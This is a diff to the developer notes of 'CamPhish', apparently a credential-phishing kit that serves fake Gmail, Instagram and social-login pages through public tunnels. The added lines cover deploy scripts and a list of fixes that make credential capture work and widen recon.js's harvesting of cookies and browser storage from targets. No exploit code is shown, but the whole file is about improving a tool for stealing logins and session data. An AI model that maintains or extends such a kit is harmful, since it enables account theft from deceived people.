@@ -14,7 +14,7 @@ Target Browser → CamPhish App (Rust :8080) → SQLite (primary) + TrailBase (:
 ```
 
 ## Critical Rules
-1. **NEVER use `docker compose down -v`** — it deletes persistent volumes (DB + captures)
+1. **Use `scripts/docker-cleanup.sh` to reset** — NOT `docker compose down -v` (which deletes persistent volumes). The script safely removes containers + volumes + local data.
 2. **NEVER rename trailbase/schema/V7__camphish.sql** — V1-V6 are TrailBase built-ins
 3. **TrailBase migration naming**: must be V7+ to avoid conflicts with built-in V1-V6
 4. **SQL DEFAULT with functions**: `DEFAULT (lower(hex(randomblob(16)))),` — needs trailing comma
@@ -32,13 +32,26 @@ Target Browser → CamPhish App (Rust :8080) → SQLite (primary) + TrailBase (:
 - Docker: Alpine 3.20 runtime, multi-stage build (Node 20 + Rust 1.96)
 - Tunnel: Cloudflare Tunnel or Ngrok
 
-## Build Commands
-```bash
-docker compose --profile cloudflared build app   # Build app image
-docker compose --profile cloudflared up -d        # Start all services
-cd backend && cargo check                         # Check Rust compilation
-cd frontend && npm install && npm run build       # Build React frontend
-```
+## Build & Deploy Commands
+\`\`\`bash
+# Build Docker image
+docker compose build app
+
+# Full Docker deployment with tunnel auto-discovery
+./scripts/docker-start.sh                # uses cloudflared (default)
+TUNNEL=ngrok ./scripts/docker-start.sh   # uses ngrok
+
+# Local dev (no Docker, optional tunnel)
+./scripts/dev.sh                         # backend + tunnel + frontend build
+TUNNEL=none ./scripts/dev.sh             # local only, no tunnel
+RELEASE=1 ./scripts/dev.sh               # release build for perf testing
+
+# Just the Docker app locally (no tunnel)
+docker compose up -d app
+
+# Clean up everything (containers + volumes + local data)
+./scripts/docker-cleanup.sh
+\`\`\`
 
 ## Key File Locations
 - Backend: `backend/src/{main.rs, api/mod.rs, capture.rs, db.rs, templates.rs, trailbase.rs}`
@@ -46,6 +59,7 @@ cd frontend && npm install && npm run build       # Build React frontend
 - Templates: `templates/*.html` + `templates/recon.js`
 - Schema: `backend/migrations/001_init.sql` + `trailbase/schema/V7__camphish.sql`
 - Docker: `Dockerfile` (multi-stage Alpine) + `docker-compose.yml`
+- Scripts: `scripts/docker-start.sh` (auto tunnel) + `scripts/docker-cleanup.sh` (full reset)
 
 ## Capture Endpoints
 - `POST /api/capture/ip` — IP + User-Agent
@@ -83,3 +97,12 @@ cd frontend && npm install && npm run build       # Build React frontend
 - Color match: DOMContentLoaded fires too late → set up listeners immediately
 - Festival: spinner forever → make it interactive (gift opening)
 - Dress-up: hidden start button → auto-start on load
+- Gmail credential capture: template had no `#user` input field, only a static `#emailDisplay` span → `captureCreds()` always returned early
+- Syntax error in 4 social login templates: extra `)` after `captureCreds()` — breaks script execution
+- Instagram credential capture: duplicate inline `fetch` and dead `captureCreds()` function
+- Event names: templates used placeholder `'0_login'` instead of descriptive template-specific names
+- Cloudflared v2025+ wraps tunnel URL in `|` boxes — grep still works but script wait time may need adjustment
+- `storage_dumps` had no `ip_address` column — cross-referencing required session_id join with ip_logs
+- `receive_storage` didn't log events — missing from session replay timeline unlike `receive_credentials`
+- No pagination on `/api/storage` and `/api/credentials` — hardcoded LIMIT silently dropped data
+- recon.js StorageGrabber: value truncation at 2000 chars without reporting actual size; no CookieStore/Cache API/storage estimate
